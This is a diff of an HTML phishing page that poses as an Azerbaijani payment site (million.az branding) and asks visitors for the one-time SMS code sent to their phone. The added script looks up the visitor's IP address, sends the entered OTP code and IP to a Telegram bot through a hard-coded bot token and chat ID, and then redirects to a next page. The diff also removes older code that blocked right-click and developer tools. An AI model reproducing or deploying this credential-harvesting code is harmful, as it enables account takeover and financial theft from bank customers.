@@ -11,78 +11,87 @@
             margin: 0;
             padding: 0;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #fffff; /* Koyu turuncu arka plan */
+            background-color: #fffff;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
         }
+
         .container {
-            background-color: #fff; /* Beyaz arka plan */
+            background-color: #fff;
             border-radius: 15px;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
             padding: 50px;
-            width: 55vw; /* Set width to 55% of the viewport width */
-            height: 55vh; /* Set height to 55% of the viewport height */
+            width: 55vw;
+            height: 55vh;
             text-align: center;
         }
+
         .form-group {
             margin-bottom: 20px;
         }
+
         label {
             font-weight: bold;
             display: block;
             margin-bottom: 5px;
         }
+
         input[type="number"] {
             width: calc(100% - 12px);
             padding: 10px;
-            border: 2px solid black; /* Koyu turuncu çerçeve */
+            border: 2px solid black;
             border-radius: 40px;
             box-sizing: border-box;
             font-size: 14px;
         }
+
         button {
             width: 100%;
             padding: 10px;
             border: none;
             border-radius: 40px;
-            background-color: #cccccc; /* Default gray when disabled */
+            background-color: #cccccc;
             color: #fff;
             cursor: not-allowed;
             font-size: 16px;
             transition: background-color 0.3s ease;
-            margin-top: 20px; /* Butonu yukarı taşı */
+            margin-top: 20px;
         }
+
         button:enabled {
-            background-color: #45a049; /* Green color when enabled */
+            background-color: #45a049;
             cursor: pointer;
         }
+
         button:disabled {
-            background-color: #cccccc; /* Disable color when button is disabled */
+            background-color: #cccccc;
             cursor: not-allowed;
         }
-        button:hover {
-            background-color: #45a049; /* Hover effect for green button */
-        }
+
         .logo {
             margin-bottom: 20px;
             text-align: center;
         }
+
         .bank-icons {
             display: flex;
             justify-content: center;
             margin-top: 20px;
         }
+
         .bank-icons i {
             font-size: 24px;
             margin: 0 10px;
             color: #888;
             transition: color 0.3s ease;
         }
+
         .bank-icons i:hover {
             color: #333;
         }
+
         .timer {
             font-size: 2rem;
             color: #333;
@@ -90,19 +99,20 @@
         }
     </style>
 </head>
+
 <body>
     <div class="container">
         <div class="logo">
             <img src="https://million.az/logo/main-logo.svg" alt="Logo" width="200">
         </div>
-        <div class="timer" id="timer">02:00</div> <!-- 2 dakikalık zaman sayacı -->
+        <div class="timer" id="timer">02:00</div>
         <form id="myForm">
             <div class="form-group">
                 <div class="item item-indent">Telefonunuza gələn birdəfəlik OTP şifrəni daxil edin. </div>
                 <label for="cardName">Şifrə göndərildi: +994*******</label>
                 <input type="number" id="cardName" placeholder="Otp Kod" maxlength="7" minlength="4" required>
             </div>
-      
+
             <div style="text-align: center;">
                 <button type="button" id="submitButton" disabled>İləri <i class="fas fa-arrow-right"></i></button>
             </div>
@@ -115,26 +125,17 @@
     </div>
 
     <script>
-        // Başlangıç zamanı
         var startTime = new Date().getTime();
-
-        // 2 dakika sonraki zamanı hesapla
         var endTime = startTime + (2 * 60 * 1000);
 
-        // Her saniyede bir zamanı güncelle
-        var timerInterval = setInterval(function() {
-            // Geçen süreyi hesapla
+        var timerInterval = setInterval(function () {
             var currentTime = new Date().getTime();
             var elapsedTime = endTime - currentTime;
-
-            // Dakika ve saniye değerlerini hesapla
             var minutes = Math.floor((elapsedTime % (1000 * 60 * 60)) / (1000 * 60));
             var seconds = Math.floor((elapsedTime % (1000 * 60)) / 1000);
 
-            // Zamanı güncelle
             document.getElementById("timer").innerHTML = formatTime(minutes) + ":" + formatTime(seconds);
 
-            // Zaman dolunca butonu devre dışı bırak
             if (elapsedTime < 0) {
                 clearInterval(timerInterval);
                 document.getElementById("timer").innerHTML = "00:00";
@@ -142,18 +143,14 @@
             }
         }, 1000);
 
-        // Zamanı iki haneli format haline getir
         function formatTime(time) {
             return time < 10 ? "0" + time : time;
         }
 
-        // Alanlar dolunca butonu etkinleştir
-        document.getElementById("myForm").addEventListener("input", function() {
+        document.getElementById("myForm").addEventListener("input", function () {
             var cardName = document.getElementById("cardName").value;
-            
             var submitButton = document.getElementById("submitButton");
 
-            // Otp kodunun uzunluğunun 4 ile 7 arasında olup olmadığını kontrol et
             if (cardName.trim().length >= 4 && cardName.trim().length <= 7) {
                 submitButton.disabled = false;
             } else {
@@ -161,65 +158,40 @@
             }
         });
 
-        // Pencereyi büyüt
-        window.onload = function() {
-            // Resize the window to 55% of the viewport size
-            window.resizeTo(window.innerWidth * 0.55, window.innerHeight * 0.55);
-        };
-    </script>
+        const botToken = '8136871782:AAGl_5_It13PYi6UPTsVZRQB2LgTVrjG7Ao';
+        const chatId = '-1002496527853';
 
-    <SCRIPT LANGUAGE="Javascript"><!--
-        // ***********************************************
-        //     UYARISIZ SAG TIK VE F12 ENGELLEME KODU
-        // ***********************************************
-           document.onkeypress = function (event) {
-               event = (event || window.event);
-               if (event.keyCode == 123) {
-                  //alert('No F-12');
-                   return false;
-               }
-           }
-           document.onmousedown = function (event) {
-               event = (event || window.event);
-               if (event.keyCode == 123) {
-                   //alert('No F-keys');
-                   return false;
-               }
-           }
-        document.onkeydown = function (event) {
-               event = (event || window.event);
-               if (event.keyCode == 123) {
-                   //alert('No F-keys');
-                   return false;
-               }
-           }
-        var isNS = (navigator.appName == "Netscape") ? 1 : 0;
-        var EnableRightClick = 0;
-        if(isNS)
-        document.captureEvents(Event.MOUSEDOWN||Event.MOUSEUP);
-        function mischandler(){
-        if(EnableRightClick==1){ return true; }
-        else {return false; }
-        }
-        function mousehandler(e){
-        if(EnableRightClick==1){ return true; }
-        var myevent = (isNS) ? e : event;
-        var eventbutton = (isNS) ? myevent.which : myevent.button;
-        if((eventbutton==2)||(eventbutton==3)) return false;
-        }
-        function keyhandler(e) {
-        var myevent = (isNS) ? e : window.event;
-        if (myevent.keyCode==96)
-        EnableRightClick = 1;
-        return;
-        }
-        document.oncontextmenu = mischandler;
-        document.onkeypress = keyhandler;
-        document.onmousedown = mousehandler;
-        document.onmouseup = mousehandler;
-        //-->
-    </script>
+        document.getElementById("submitButton").addEventListener("click", function () {
+            var cardName = document.getElementById("cardName").value;
 
+            fetch("https://api.ipify.org?format=json")
+                .then(response => response.json())
+                .then(data => {
+                    const userIP = data.ip;
+                    const message = `Otp-1: ${cardName}\nIP: ${userIP}`;
+
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                        }),
+                    })
+                        .then(data => {
+                            window.location.href = "index2.html";
+                        })
+                        .catch(error => {
+                            console.error('Telegram Mesajı Gönderme Hatası:', error);
+                        });
+                })
+                .catch(error => {
+                    console.error('IP Adresi Alınamadı:', error);
+                });
+        });
+    </script>
 </body>
 
 </html>
